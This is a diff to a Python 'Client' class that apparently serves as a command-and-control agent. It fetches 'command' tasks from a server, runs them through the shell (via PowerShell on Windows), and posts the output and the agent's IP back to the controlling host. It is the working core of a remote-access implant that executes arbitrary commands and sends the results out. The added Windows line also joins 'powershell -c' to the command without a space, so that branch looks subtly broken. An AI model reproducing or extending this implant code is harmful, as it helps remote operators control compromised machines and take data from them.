@@ -36,7 +36,10 @@ class Client:
             #print(task)
             if task == "command":
                 command = task_json.get('command')
-                ps = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, check=True)
+                if platform.system() == "Windows":
+                    ps = subprocess.run("powershell -c" + command, shell=True, capture_output=True, text=True, timeout=60, check=True)
+                else:
+                    ps = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, check=True)
                 data = {'agent_id':self.local_ip,'task_id': task_id, 'result': ps.stdout,'returncode': ps.returncode}
                 req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
             elif task == "download":
